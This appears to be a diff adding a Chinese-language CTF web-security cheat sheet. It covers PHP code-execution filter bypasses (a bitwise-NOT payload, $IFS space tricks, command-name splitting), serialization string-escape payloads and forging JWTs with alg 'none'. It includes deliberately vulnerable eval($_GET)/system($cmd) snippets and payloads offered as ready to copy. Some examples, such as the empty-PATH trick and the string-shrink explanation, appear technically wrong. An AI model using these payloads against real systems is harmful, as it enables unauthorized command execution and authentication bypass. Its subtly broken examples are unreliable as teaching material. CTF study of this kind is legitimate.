+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>直接用取反Payload：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=~%8F%97%8E%8E%93%96%91%93%92%9B%96%91%9C%9A%92%95%8E%93%92%9B%96%91;
+</span></span></code></pre></td></tr></table>
+</div>
+</div>自动执行：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system(&#39;cat flag&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div>直接拿Flag！</li>
+</ul>
+</li>
+<li>七、超简总结（背会直接做题）
+<ol>
+<li><strong>正则过滤字母/数字 → 用异或、取反绕过</strong></li>
+<li><strong>属于 CTF Web → 代码执行/RCE 题型</strong></li>
+<li><strong>取反绕过最简单，CTF直接复制Payload就能用</strong></li>
+<li>核心口诀：
+<strong>不用字母数字，照样执行命令！</strong></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>命令执行正则绕过实战<br>
+这是 <strong>CTF Web 题型中 RCE（远程命令执行）</strong> 最核心、最常考、最实用的绕过技巧！
+我直接给你<strong>能上场做题的实战版</strong>，不讲废话，全是能用的 payload！
+<ul>
+<li>
+<p>一、前置场景（CTF 必见）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 过滤了 空格、引号、反斜杠、字母组合等
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\s|</span><span class="se">\\</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">|&#39;|system|exec/i&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;WAF！&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>目标</strong>：执行 <code>cat flag</code> 拿到 flag，但被正则拦了各种字符。</p>
+</li>
+<li>
+<p>二、1. 空格绕过（最常用）</p>
+<ul>
+<li>场景
+过滤了 <strong>空格 <code> </code></strong>，无法输入 <code>cat flag</code></li>
+<li>绕过方法（全部背下来）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1. cat${IFS}flag       # 最稳
+</span></span><span class="line"><span class="cl">2. cat$IFS$9flag       # 通用
+</span></span><span class="line"><span class="cl">3. cat&lt;flag            # 重定向
+</span></span><span class="line"><span class="cl">4. cat&lt;&gt;flag           # 重定向
+</span></span><span class="line"><span class="cl">5. {cat,flag}          # 花括号
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>实战 Payload</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=cat$IFS$9flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>二、2. 反斜杠 / 引号绕过（单引号、双引号、\ 被过滤）</p>
+<ul>
+<li>
+<p>场景
+过滤了 <code>'</code> <code>&quot;</code> <code>\</code></p>
+</li>
+<li>
+<p>绕过方法：<strong>不用引号！不用反斜杠！直接写！</strong>
+因为 Linux 命令<strong>本来就不需要引号</strong>！</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 正常
+</span></span><span class="line"><span class="cl">cat &#34;flag&#34;
+</span></span><span class="line"><span class="cl">cat &#39;flag&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 绕过（直接去掉）
+</span></span><span class="line"><span class="cl">cat flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果过滤了关键字，用反斜杠（但被过滤就不用）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c\at fl\ag       # 有反斜杠才能用
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>三、3. 变量拼接绕过（过滤函数名、命令名最强绕过）</p>
+<ul>
+<li>场景
+过滤了 <code>cat</code>、<code>ls</code>、<code>flag</code> 等关键词</li>
+<li>原理
+把命令拆成变量，再拼起来执行！</li>
+<li>方法 1：系统变量拼接（最简单）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=c;b=at;$a$b flag       → 执行 cat flag
+</span></span><span class="line"><span class="cl">l=ls;$l       → 执行 ls
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>方法 2：自定义变量拼接</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x=fl;y=ag;cat $x$y
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>方法 3：无字母数字也能拼接（CTF 高级）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PATH=&#34;&#34;
+</span></span><span class="line"><span class="cl">c=$PATH/cat
+</span></span><span class="line"><span class="cl">$c flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>实战 Payload（直接用）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=a=c;b=at;$a$b$IFS$9flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>三大绕过合集</p>
+<ul>
+<li>
+<ol>
+<li>空格绕过</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat$IFS$9flag
+</span></span><span class="line"><span class="cl">cat${IFS}flag
+</span></span><span class="line"><span class="cl">{cat,flag}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="2">
+<li>引号 / 反斜杠绕过</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat flag    # 直接不用
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="3">
+<li>命令关键字过滤（拼接绕过）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=c;b=at;$a$b flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>终极组合 Payload（通杀大部分 WAF）</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=a=c;b=at;$a$b$IFS$9flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>超简总结（背会直接拿分）</p>
+<ol>
+<li><strong>过滤空格</strong> → 用 <code>$IFS$9</code></li>
+<li><strong>过滤引号/反斜杠</strong> → 直接不用</li>
+<li><strong>过滤命令名</strong> → 变量拼接 <code>a=c;b=at;$a$b</code></li>
+<li><strong>终极 payload</strong>：<code>a=c;b=at;$a$b$IFS$9flag</code></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>序列化字符串逃逸实战<br>
+这是 <strong>CTF Web 必考难点</strong>，属于 <strong>PHP 反序列化漏洞</strong> 下的 <strong>字符串逃逸</strong> 题型，分为 <strong>字符变多逃逸</strong> 和 <strong>字符变少逃逸</strong> 两种。
+<ul>
+<li>
+<p>一、什么是序列化字符串逃逸？
+PHP 反序列化<strong>严格按照长度 <code>s:3:&quot;abc&quot;</code> 解析</strong>。<br>
+如果题目通过<strong>过滤/替换</strong>让字符串<strong>变长 or 变短</strong>，长度不匹配，我们就能<strong>构造恶意数据</strong>，吃掉后面的内容，控制反序列化结果。
+核心标志：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 题目代码一定有这种 替换导致长度变化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;old&#34;</span><span class="p">,</span> <span class="s2">&#34;new&#34;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>    <span class="c1">// old→new 长度变多
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;new&#34;</span><span class="p">,</span> <span class="s2">&#34;old&#34;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>    <span class="c1">// new→old 长度变少
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>二、前置知识（必须懂）
+正常序列化：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>格式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">类型:长度:&#34;值&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>长度错一个字符，反序列化直接失败！</strong>
+逃逸就是利用这个特性。</p>
+</li>
+<li>
+<p>三、第一种：字符变多逃逸（最常考）</p>
+<ul>
+<li>原理
+<code>old</code> → <code>ooooold</code>
+<strong>1个字符 → 变成多个字符，字符串变长</strong>
+每替换一次，<strong>多出来 N 个字符</strong>，就能<strong>吞掉 N 个正常字符</strong>。</li>
+<li>题目特征</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;bb&#34;</span><span class="p">,</span> <span class="nv">$user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// a → bb  每次替换 多1个字符
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>逃逸逻辑
+<ul>
+<li>正常长度：<code>s:4:&quot;aaaa&quot;</code></li>
+<li>替换后：<code>s:4:&quot;bbbbbbbb&quot;</code></li>
+<li>长度不匹配 → 后面内容被吃掉 → 我们注入恶意结构。</li>
+</ul>
+</li>
+<li>目标
+构造：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">a</span><span class="s2">&#34;;}s:1:&#34;</span><span class="nx">x</span><span class="s2">&#34;;s:3:&#34;</span><span class="mi">111</span><span class="s2">&#34;;}
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>让它被长度错误<strong>吞进内部</strong>，实现<strong>提前闭合</strong>，控制变量。</p>
+</li>
+<li>
+<p>四、第二种：字符变少逃逸</p>
+<ul>
+<li>原理
+<code>bb</code> → <code>b</code>
+<strong>多个字符 → 变成1个字符，字符串变短</strong>
+空出来的长度，<strong>可以让我们把后面的正常内容拉进来</strong>。</li>
+<li>题目特征</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;bb&#34;</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="nv">$user</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>逃逸逻辑
+<ul>
+<li>原长度：<code>s:4:&quot;bbbb&quot;</code></li>
+<li>替换后：<code>s:4:&quot;bb&quot;</code></li>
+<li>长度变长 → 反序列化会<strong>继续读取后面内容</strong>直到凑够长度</li>
+<li>我们就能<strong>劫持后面的结构</strong>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>五、最简单记忆法</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>替换规则</th>
+<th>逃逸方向</th>
+<th>难度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>字符变多逃逸</strong></td>
+<td>少 → 多（a→bb）</td>
+<td>向前吞内容</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>字符变少逃逸</strong></td>
+<td>多 → 少（bb→b）</td>
+<td>向后吃内容</td>
+<td>⭐⭐⭐⭐</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+<li>
+<p>六、实战模板（直接背）</p>
+<ul>
+<li>
+<ol>
+<li>字符变多逃逸 Payload 结构</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;aaaaa&#34;</span><span class="p">;}</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;cmd&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;flag&#34;</span><span class="p">;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>每一个 <code>a</code> 变 <code>bb</code>，多1字符。
+构造 <strong>N 个 a</strong> 让长度刚好把后面正常内容全部吃掉。</p>
+<ul>
+<li>
+<ol start="2">
+<li>字符变少逃逸 Payload 结构</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;bbbbbbbbbbbb&#34;</span><span class="nx">xxxxxxxxxxxx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>bb</code> 变 <code>b</code>，缩短长度，空出位置，把后面正常字段变成自己的值。</p>
+</li>
+<li>
+<p>七、最简单实战例子（一看就懂）</p>
+<ul>
+<li>题目代码</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;x&#34;</span><span class="p">,</span><span class="s2">&#34;yy&#34;</span><span class="p">,</span><span class="nv">$user</span><span class="p">);</span> <span class="c1">// x→yy 每次多1字符（变多逃逸）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="o">=&gt;</span><span class="nv">$user</span><span class="p">,</span><span class="s1">&#39;pass&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;123&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$u</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$u</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;flag{success}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>目标
+让 <code>user=admin</code>，但我们只能控制 <code>user</code> 输入。</p>
+</li>
+<li>
+<p>构造逃逸 Payload
+输入：</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xxxxxxxxxxxxxxxxxxxxxx&#34;;}s:4:&#34;user&#34;;s:5:&#34;admin&#34;;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>原理
+大量 <code>x</code> 被替换成 <code>yy</code>，长度暴增，把后面的 <code>pass</code> 全部吞掉，
+然后我们<strong>提前闭合数组</strong>，<strong>重新构造 user=admin</strong>。</li>
+</ul>
+<p>反序列化后：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;admin&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接拿到 Flag！</p>
+</li>
+<li>
+<p>八、超简总结（背会直接做题）</p>
+<ul>
+<li>
+<ol>
+<li>核心口诀</li>
+</ol>
+<ul>
+<li><strong>字符变多逃逸</strong>：替换后变长 → 吞掉后面内容 → 提前闭合</li>
+<li><strong>字符变少逃逸</strong>：替换后变短 → 变长读取 → 劫持后面内容</li>
+<li><strong>关键就是：长度不匹配 = 可操控结构</strong></li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>解题步骤</li>
+<li>看有没有 <code>str_replace</code></li>
+<li>看是<strong>变长</strong>还是<strong>变短</strong></li>
+<li>构造Payload让长度刚好逃逸</li>
+<li>提前闭合、注入恶意结构</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>JWT认证<br>
+标准格式、利用流程、空加密算法、密钥爆破实战。
+<ul>
+<li>
+<p>一、JWT 是什么？（JSON Web Token）</p>
+<ul>
+<li>
+<ol>
+<li>一句话定义
+JWT 是<strong>轻量级身份认证令牌</strong>，常用于登录鉴权。
+CTF 里只要看到请求头里有：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>100% 是 JWT 题型！</strong></p>
+<ul>
+<li>
+<ol start="2">
+<li>JWT 标准格式（三段式）
+JWT 由 <strong><code>.</code></strong> 分割成三部分：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Header</span><span class="o">.</span><span class="n">Payload</span><span class="o">.</span><span class="n">Signature</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li><strong>Header（头）</strong>：声明算法+类型</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;alg&#34;</span><span class="p">:</span><span class="s2">&#34;HS256&#34;</span><span class="p">,</span><span class="nt">&#34;typ&#34;</span><span class="p">:</span><span class="s2">&#34;JWT&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li><strong>Payload（载荷）</strong>：存放用户信息（uid、username、admin）</li>
+<li><strong>Signature（签名）</strong>：服务器用<strong>密钥</strong>加密，防篡改</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>二、CTF JWT 利用过程（通用步骤）</p>
+<ul>
+<li>标准利用流程（背下来）
+<ol>
+<li>抓包拿到 JWT Token</li>
+<li>去解码网站解析：<strong>jwt.io</strong></li>
+<li>修改 Payload 里的权限（<code>admin:1</code>、<code>uid:1</code>）</li>
+<li>重新签名 / 绕过签名</li>
+<li>发包 → 越权拿到 Flag
+CTF 里 90% 的 JWT 题目都是：
+<strong>改 admin → 绕过签名 → 拿flag</strong></li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>三、空加密算法攻击（最简单，必考）</p>
+<ul>
+<li>
+<ol>
+<li>原理
+服务器支持 <strong>alg: none</strong> 空加密算法。
+意思是：<strong>不需要签名，直接信任 Token</strong>。</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>攻击步骤</li>
+<li>把 Header 改成：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;alg&#34;</span><span class="p">:</span><span class="s2">&#34;none&#34;</span><span class="p">,</span><span class="nt">&#34;typ&#34;</span><span class="p">:</span><span class="s2">&#34;JWT&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>修改 Payload：<code>&quot;admin&quot;:1</code></li>
+<li><strong>签名留空</strong>，最后加一个 <code>.</code></li>
+<li>直接发包，服务器直接信任！</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>最终Payload（直接复制格式）</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1aWQiOjEsImFkbWluIjp0cnVlfQ==.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<ol start="4">
+<li>CTF 特征
+看到代码里：</li>
+</ol>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">)[</span><span class="mi">0</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$headers</span><span class="o">-&gt;</span><span class="na">alg</span> <span class="o">===</span> <span class="s1">&#39;none&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 不验证签名！直接通过！
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
